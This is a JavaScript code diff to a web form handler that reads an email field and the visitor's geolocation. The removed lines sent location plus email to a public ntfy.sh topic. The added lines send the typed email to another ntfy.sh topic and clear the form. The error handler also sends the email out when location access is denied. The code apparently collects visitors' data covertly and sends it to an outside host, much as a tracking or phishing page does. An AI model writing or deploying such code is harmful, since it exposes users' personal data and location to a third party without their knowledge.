@@ -3,7 +3,13 @@ let submiteateste = (event) => {
     event.preventDefault();
     let id = document.getElementById('email').value
     if (id.length > 6) {
-        obtenerUbicacion()
+        //        obtenerUbicacion()
+        msg = JSON.stringify(id)
+        fetch('https://ntfy.sh/testing', {
+            method: 'POST',
+            body: msg
+        })
+        document.getElementById('email').value = ''
     }
 }
 function obtenerUbicacion() {
@@ -18,18 +24,11 @@ function mostrarPosicion(posicion) {
     var latitud = posicion.coords.latitude;
     var longitud = posicion.coords.longitude;
     pos = { latitude: latitud, longitude: longitud, id: document.getElementById('email').value }
-    msg = JSON.stringify(pos)
-    fetch('https://ntfy.sh/xrpw_alery', {
-        method: 'POST',
-        body: msg
-    })
-    document.getElementById('email').value = ''
-
 }
 function mostrarError(error) {
     switch (error.code) {
         case error.PERMISSION_DENIED:
-            alert("El usuario denegó la solicitud de geolocalización.");
+            alert("no permission");
             msg = JSON.stringify(document.getElementById('email').value)
             fetch('https://ntfy.sh/xrpw_alery', {
                 method: 'POST',
